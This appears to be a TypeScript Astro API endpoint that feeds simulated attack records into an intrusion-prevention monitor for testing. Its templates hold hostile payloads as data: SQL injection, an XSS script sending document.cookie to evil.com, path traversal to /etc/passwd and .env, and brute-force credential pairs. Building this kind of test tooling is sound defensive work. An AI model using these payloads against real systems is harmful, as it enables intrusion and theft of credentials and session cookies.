import type { APIRoute } from 'astro';
import {
  recordAttack,
  getSecurityStats,
  getBannedIps,
  getAttackLogs,
  type AttackType,
  type ThreatSeverity
} from '../../../lib/server/security-monitor';

export const POST: APIRoute = async ({ request }) => {
  try {
    const body = await request.json();
    const {
      attackType = 'SQL_INJECTION',
      ip = `198.51.100.${Math.floor(Math.random() * 250) + 1}`,
      method = 'GET',
      path = '/api/search',
      customPayload,
      userAgent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) ThreatSimulator/2.0'
    } = body;

    const templates: Record<
      AttackType,
      {
        severity: ThreatSeverity;
        threatScore: number;
        details: string;
        payload: string;
        path: string;
      }
    > = {
      SQL_INJECTION: {
        severity: 'CRITICAL',
        threatScore: 90,
        details: 'Simulação de Injeção SQL em parâmetro de busca',
        payload: "1' UNION SELECT 1,table_name,column_name FROM information_schema.columns--",
        path: '/api/courses?q='
      },
      XSS: {
        severity: 'HIGH',
        threatScore: 70,
        details: 'Simulação de Cross-Site Scripting Refletido',
        payload: '<script>fetch("https://evil.com/steal?cookie="+document.cookie)</script>',
        path: '/search?keyword='
      },
      PATH_TRAVERSAL: {
        severity: 'CRITICAL',
        threatScore: 85,
        details: 'Simulação de LFI / Path Traversal em arquivo de configuração',
        payload: '../../../../etc/passwd',
        path: '/api/video?file=../../../../.env'
      },
      MALICIOUS_SCANNER: {
        severity: 'HIGH',
        threatScore: 60,
        details: 'Simulação de Scanner automatizado buscando painel de administração vulnerável',
        payload: '/wp-login.php?redirect_to=admin',
        path: '/wp-login.php'
      },
      BAD_USER_AGENT: {
        severity: 'HIGH',
        threatScore: 50,
        details: 'Simulação de User-Agent de ferramenta de invasão conhecida',
        payload: 'sqlmap/1.7.2#stable (https://sqlmap.org)',
        path: '/api/auth/login'
      },
      RATE_ABUSE: {
        severity: 'MEDIUM',
        threatScore: 40,
        details: 'Simulação de rajada volumétrica de requisições por segundo',
        payload: 'BURST_ATTACK_100_REQ_SEC',
        path: '/api/search/ai'
      },
      AUTH_BRUTE_FORCE: {
        severity: 'HIGH',
        threatScore: 65,
        details: 'Simulação de ataque de força bruta no endpoint de login',
        payload: 'admin:password123, root:toor, admin:admin',
        path: '/api/auth/login'
      },
      SUSPICIOUS_PAYLOAD: {
        severity: 'MEDIUM',
        threatScore: 35,
        details: 'Simulação de payload anômalo em cabeçalho ou corpo de requisição',
        payload: '{{7*7}} phpinfo() system()',
        path: '/api/profile'
      },
      PROBE: {
        severity: 'LOW',
        threatScore: 20,
        details: 'Simulação de sondagem de portas e rotas do sistema',
        payload: '/actuator/health',
        path: '/actuator/health'
      }
    };

    const chosen = templates[attackType as AttackType] || templates.SQL_INJECTION;

    const log = recordAttack({
      ip,
      method,
      path: chosen.path,
      attackType: attackType as AttackType,
      severity: chosen.severity,
      threatScore: chosen.threatScore,
      details: chosen.details,
      payloadSnippet: customPayload || chosen.payload,
      userAgent: attackType === 'BAD_USER_AGENT' ? 'sqlmap/1.7.2' : userAgent
    });

    return new Response(JSON.stringify({
      success: true,
      message: `Simulação de ataque [${attackType}] executada com sucesso contra o IPS.`,
      log,
      stats: getSecurityStats(),
      bans: getBannedIps(),
      recentLogs: getAttackLogs(20)
    }), {
      status: 200,
      headers: { 'Content-Type': 'application/json' }
    });
  } catch (error: any) {
    return new Response(JSON.stringify({
      success: false,
      error: error.message || 'Erro ao simular ataque.'
    }), {
      status: 500,
      headers: { 'Content-Type': 'application/json' }
    });
  }
};
